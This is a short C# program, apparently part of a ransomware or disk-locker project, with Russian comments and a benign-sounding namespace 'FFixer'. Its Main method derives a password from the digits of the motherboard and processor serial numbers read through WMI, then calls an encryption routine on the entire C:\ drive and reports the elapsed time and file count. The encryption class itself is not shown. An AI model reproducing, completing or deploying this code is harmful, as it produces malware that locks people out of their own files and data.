using System;
using System.Management;

namespace FFixer
{
    internal static class Program
    {
        [STAThread]
        private static void Main()
        {
            // Засекаем время, чтобы вывести время за сколько будет зашифрован весь диск
            DateTime start = DateTime.Now;
            // Генерируем пароль посредством парсинга цифр из серийников материнки и проца
            string password = Parse(GetComponent("Win32_BaseBoard", "SerialNumber") + GetComponent("win32_processor", "processorID"));
            
            //Запускаем шифрование
            Control.EncryptDirectory(@"C:\", password);

            TimeSpan timePassed = DateTime.Now - start;
            Console.WriteLine("Прошло времени: {0:hh\\:mm\\:ss} | Total files {1}", timePassed, Control.re);
            Console.ReadKey();
        }

        //Функа для получения компонентов (Спащенно из видео 2к14 года)
        private static string GetComponent(string hwclass, string syntax)
        {
            var output = string.Empty;
            ManagementObjectSearcher mos = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM " + hwclass);
            foreach (ManagementObject mj in mos.Get())
            {
                output = Convert.ToString(mj[syntax]);
            }
            return output;
        }

        // Парсим циферки из строки
        private static string Parse(string input)
        {
            string result = string.Empty;

            foreach (var c in input.ToCharArray())
            {
                if (Char.IsDigit(c))
                    result += c.ToString();
            }
            return result;
        }
    }
}